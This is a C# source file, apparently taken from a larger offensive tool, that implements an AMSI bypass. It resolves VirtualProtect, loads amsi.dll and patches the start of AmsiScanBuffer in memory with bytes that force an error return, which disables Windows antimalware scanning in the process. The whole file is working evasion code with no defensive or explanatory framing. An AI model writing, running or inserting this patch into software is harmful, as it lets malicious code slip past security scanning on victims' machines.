using System;
using System.Runtime.InteropServices;

/*
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
|| Helped by https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs ||
*/

namespace Offline.Special
{
    internal static class AMSI
    {
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate IntPtr LoadLibrary
            (
                byte[] name
            );

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate bool VirtualProtect
            (
                IntPtr lpAddress,
                UIntPtr dwSize,
                uint flNewProtect,
                out uint lpflOldProtect
            );

        static LoadLibrary loadLibrary;
        static VirtualProtect virtualProtect;

        static void PrepareDelegate()
        {
            IntPtr loadLib = Resolver.GetExportAddress("kernel32.dll", "LoadLibraryW");
            IntPtr virtualProt = Resolver.GetExportAddress("kernel32.dll", "VirtualProtect");

            loadLibrary = (LoadLibrary)Marshal.GetDelegateForFunctionPointer(loadLib, typeof(LoadLibrary));
            virtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(virtualProt, typeof(VirtualProtect));
        }

        static IntPtr LoadAmsi()
        {
            return loadLibrary(System.Text.Encoding.Unicode.GetBytes("amsi.dll"));
        }

        internal static bool BlockIt()
        {
            PrepareDelegate();

            IntPtr amsiDll = Resolver.GetModuleBaseAddress("amsi.dll", (IntPtr)(-1));
            if (amsiDll == IntPtr.Zero)
                LoadAmsi();

            IntPtr amsiScanBufferLocation = Resolver.GetExportAddress("amsi.dll", "AmsiScanBuffer");

            byte[] patchBytes = IntPtr.Size == 8 ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 } : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };

            bool b = virtualProtect(amsiScanBufferLocation, (UIntPtr)patchBytes.Length, 0x40, out uint oldProtect);

            if (!b)
                return false;

            Marshal.Copy(patchBytes, 0, amsiScanBufferLocation, patchBytes.Length);

            b = virtualProtect(amsiScanBufferLocation, (UIntPtr)patchBytes.Length, oldProtect, out uint _);

            if (!b)
                return false;

            return true;
        }
    }
}
